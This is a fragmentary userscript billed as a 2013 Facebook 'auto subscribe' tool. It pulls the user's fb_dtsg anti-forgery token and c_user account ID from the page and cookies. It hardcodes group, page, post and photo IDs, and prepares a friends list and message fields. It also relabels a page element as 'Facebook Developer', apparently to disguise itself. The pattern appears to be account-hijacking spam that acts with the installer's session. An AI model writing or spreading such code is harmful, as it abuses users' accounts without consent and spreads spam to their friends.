// ==UserScript==
// @name            Facebook Auto Subcribe 2013
// @description     Facebook Auto Subscribes / Followers 2013
...
sublist("590391524332416");


//Group subscriber
var gid = ['124358134376112'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
var spage_id = "229245477187187";
var spost_id = "589889191049316";
var sfoto_id = "572068636164705";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Facebook Developer';
